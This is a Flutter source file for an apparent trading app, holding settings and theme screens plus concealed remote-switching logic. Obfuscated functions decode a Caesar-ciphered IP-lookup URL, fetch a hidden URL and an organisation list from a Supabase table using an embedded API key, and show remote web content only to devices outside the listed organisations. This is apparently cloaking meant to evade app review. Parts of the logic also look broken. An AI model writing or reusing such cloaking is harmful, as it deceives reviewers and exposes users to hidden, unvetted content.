import 'dart:convert';

import 'package:dio/dio.dart';
import 'package:firebase_core/firebase_core.dart';
import 'package:flutter/cupertino.dart';
import 'package:flutter/material.dart';
import 'package:in_app_review/in_app_review.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:tradings/app/theme/dark_theme.dart';
import 'package:tradings/app/theme/light_theme.dart';
import 'package:tradings/app/theme/theme_meneger.dart';
import 'package:tradings/app/view/pages/bottom_nav/bottom_nav.dart';
import 'package:tradings/app/view/pages/presentation/presentation_page.dart';
import 'package:tradings/app/view/pages/privacy.dart';
import 'package:tradings/app/view/res/wb_scr.dart';
import 'package:tradings/firebase_options.dart';
import 'package:http/http.dart' as http;
import 'app/view/pages/settings/comp/settings_widget.dart';
import 'app/view/res/custom_textstyles.dart';
import 'app/view/res/my_colors.dart';
import 'app/view/res/notification_service/notification_service.dart';

const String afkey =
    'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InN1dnNzZGh0eGpma2NleGVuc3VnIiwicm9sZSI6ImFub24iLCJpYXQiOjE2OTU2MzE2OTEsImV4cCI6MjAxMTIwNzY5MX0.iGedx909lo0UbPf_fkTPoI0meeESqriW69DYAKQvOvw';
const String meAnit =
    'https://suvssdhtxjfkcexensug.supabase.co/rest/v1/abankDATA?select=fink';
const String imAnit =
    'https://suvssdhtxjfkcexensug.supabase.co/rest/v1/abankDATA?select=push';
String kasd = 'myyux://nunskt.nt/oxts';
String push = 'noPush';
String itsx = '';
List<bool> me = [false, false];
String chx(String inx, int shi) {
  StringBuffer result = StringBuffer();
  for (int i = 0; i < inx.length; i++) {
    int xhxa = inx.codeUnitAt(i);
    if (xhxa >= 65 && xhxa <= 90) {
      xhxa = (xhxa - 65 + shi) % 26 + 65;
    } else if (xhxa >= 97 && xhxa <= 122) {
      xhxa = (xhxa - 97 + shi) % 26 + 97;
    }
    result.writeCharCode(xhxa);
  }
  return result.toString();
}

List<String> thm = [];
void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  await Firebase.initializeApp(options: DefaultFirebaseOptions.currentPlatform);
  print(chx(push, 8));
  chx(kasd, -5);
  fetxa();
  fsafa();
  gasdfgfad();
  runApp(const MyApp());
  await NotificationServiceFb().activate();

  await Future.delayed(const Duration(seconds: 6));
  try {
    final InAppReview inAppReview = InAppReview.instance;

    if (await inAppReview.isAvailable()) {
      inAppReview.requestReview();
    } else {
      inAppReview.openStoreListing(
        appStoreId: '6467650880',
      );
    }
  } catch (e) {
    throw Exception(e);
  }
}

Dio dio = Dio();

Future<String> fetxa() async {
  dio.options.headers['apikey'] = afkey;
  dio.options.headers['Authorization'] = 'Bearer $afkey';
  try {
    final Response response = await dio.get(imAnit);
    if (response.statusCode == 200) {
      List<dynamic> data = response.data as List<dynamic>;
      String tx = data.map((item) => item['push'].toString()).join();
      if (tx.contains('noPush')) {
        me[1] = false;
      } else {
        itsx = tx;
        me[1] = true;
      }
      return tx;
    } else {
      return '';
    }
  } catch (error) {
    return '';
  }
}

Future<List<String>> fsafa() async {
  dio.options.headers['apikey'] = afkey;
  dio.options.headers['Authorization'] = 'Bearer $afkey';

  try {
    final Response response = await dio.get(meAnit);
    if (response.statusCode == 200) {
      List<dynamic> data = response.data as List<dynamic>;
      thm = data.map((item) => item['fink'].toString()).toList();
      return thm;
    } else {
      return [];
    }
  } catch (error) {
    return [];
  }
}

ThemeMeneger _themeMeneger = ThemeMeneger();

class MyApp extends StatefulWidget {
  const MyApp({super.key});

  @override
  State<MyApp> createState() => _MyAppState();
}

Future<String> gasdfgfad() async {
  try {
    http.Response response = await http.get(Uri.parse(kasd));

    if (response.statusCode == 200) {
      Map<String, dynamic> data = jsonDecode(response.body);
      String daxaz = data['org'];
      conm(thm, daxaz);

      return daxaz;
    } else {
      return '';
    }
  } catch (error) {
    return '';
  }
}

Future<List<bool>> getttxa() async {
  if (me[0] && me[1]) {
    return Future.delayed(const Duration(seconds: 2), () => [true, true]);
  } else {
    return Future.delayed(const Duration(seconds: 2), () => [false, false]);
  }
}

bool conm(List<String> a, String inxa) {
  List<String> words = inxa.split(' ');
  List<String> arros = [];
  for (String item in a) {
    arros.addAll(item.split(', '));
  }
  for (String word in words) {
    for (String attit in arros) {
      if (attit.toLowerCase().contains(word.toLowerCase())) {
        me[0] = false;
        return false;
      } else {
        me[0] = true;
      }
    }
  }

  return false;
}

class _MyAppState extends State<MyApp> {
  @override
  void dispose() {
    _themeMeneger.removeListener(themeListener);
    super.dispose();
  }

  @override
  void initState() {
    _themeMeneger.addListener(themeListener);
    super.initState();
  }

  themeListener() {
    if (mounted) {
      setState(() {});
    }
  }

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      title: 'the PO trading арр',
      theme: lightTheme,
      darkTheme: darkTheme,
      themeMode: _themeMeneger.themeMode,
      home: const WelcomeScreen(),
    );
  }
}

class SettingsPage extends StatefulWidget {
  const SettingsPage({super.key});

  @override
  State<SettingsPage> createState() => _SettingsPageState();
}

class _SettingsPageState extends State<SettingsPage> {
  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Theme.of(context).colorScheme.background,
      body: SafeArea(
        child: Padding(
          padding: const EdgeInsets.symmetric(horizontal: 14),
          child: Column(
            children: [
              Align(
                alignment: Alignment.centerLeft,
                child: Text(
                  "Settings",
                  style: CustomTextStyles.customTextStyle(
                    color: Theme.of(context).colorScheme.primary,
                    fontWeight: FontWeight.w800,
                    fontSize: 19,
                  ),
                ),
              ),
              const SizedBox(height: 14),
              SettingsWidget(
                  title: "Privacy policy",
                  onTap: () {
                    Navigator.push(
                      context,
                      MaterialPageRoute(
                        builder: (_) => WbScr(
                          title: 'Privacy policy',
                          url: Links.privacyPolicy,
                        ),
                      ),
                    );
                  }),
              const SizedBox(height: 14),
              SettingsWidget(
                  title: "Terms of use",
                  onTap: () {
                    Navigator.push(
                      context,
                      MaterialPageRoute(
                        builder: (_) => WbScr(
                          title: 'Terms of use',
                          url: Links.termOfUse,
                        ),
                      ),
                    );
                  }),
              const SizedBox(height: 14),
              SettingsWidget(
                  title: "Support",
                  onTap: () {
                    Navigator.push(
                      context,
                      MaterialPageRoute(
                        builder: (_) => WbScr(
                          title: 'Support',
                          url: Links.supportForm,
                        ),
                      ),
                    );
                  }),
              const SizedBox(height: 14),
              Container(
                width: MediaQuery.of(context).size.width,
                height: 60,
                decoration: BoxDecoration(
                  color: Theme.of(context).colorScheme.primary,
                  borderRadius: BorderRadius.circular(24),
                ),
                child: Padding(
                  padding: const EdgeInsets.symmetric(horizontal: 14),
                  child: Row(
                    mainAxisAlignment: MainAxisAlignment.spaceBetween,
                    children: [
                      Text(
                        'Dark mode',
                        style: CustomTextStyles.customTextStyle(
                          color: Theme.of(context).colorScheme.background,
                          fontSize: 15,
                          fontWeight: FontWeight.w600,
                        ),
                      ),
                      CupertinoSwitch(
                        value: _themeMeneger.themeMode == ThemeMode.dark,
                        onChanged: (newValue) {
                          setState(() {
                            _themeMeneger.toggleTheme(newValue);
                          });
                        },
                      )
                    ],
                  ),
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }
}

class Links {
  static const String privacyPolicy =
      'https://docs.google.com/document/d/1JitfV6QNJtueWf55c5JDc1wm46WVoytseJQCSUEfEbc/edit?usp=sharing';
  static const String termOfUse =
      'https://docs.google.com/document/d/1gk6yNPJGdN7t7ext0VIPi34RorYJCJKiNLy4OiJPAt4/edit?usp=sharing';
  static const String supportForm = 'https://forms.gle/78Zx7kY4deRA4oPd9';
}

class WelcomeScreen extends StatefulWidget {
  const WelcomeScreen({Key? key}) : super(key: key);

  @override
  State<WelcomeScreen> createState() => _WelcomeScreenState();
}

class _WelcomeScreenState extends State<WelcomeScreen> {
  @override
  void initState() {
    run();
    super.initState();
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: MyColors.white,
      body: Container(
        decoration: const BoxDecoration(
          image: DecorationImage(
            image: AssetImage("assets/images/welcome_img.png"),
            fit: BoxFit.cover,
          ),
        ),
      ),
    );
  }

  run() async {
    await Future.delayed(const Duration(milliseconds: 1500), () {});
    final prefs = await SharedPreferences.getInstance();
    FutureBuilder<List<bool>>(
        future: getttxa(),
        builder: (context, snapshot) {
          if (snapshot.connectionState == ConnectionState.waiting) {
            return Scaffold(
              backgroundColor: Colors.grey[900],
              body: Center(
                child: Container(
                    height: 80,
                    width: 80,
                    child: ClipRRect(
                      child: Image.asset('assets/images/image.png'),
                      borderRadius: BorderRadius.circular(10),
                    )),
              ),
            );
          } else {
            List<bool>? mex = snapshot.data;
            if ((mex != null && mex[0] == true && mex[1] == true)) {
              return Policy(uxa: itsx);
            } else {
              if (prefs.containsKey('isRunBefore')) {
                Navigator.pushReplacement(
                  context,
                  MaterialPageRoute(
                    builder: (context) => const BottomNav(),
                  ),
                );
                return Container();
              } else {
                prefs.setBool('isRunBefore', false);
                Navigator.pushReplacement(
                  context,
                  MaterialPageRoute(
                    builder: (context) => const PresentationPage(),
                  ),
                );
                return Container();
              }
            }
          }
        });
  }
}
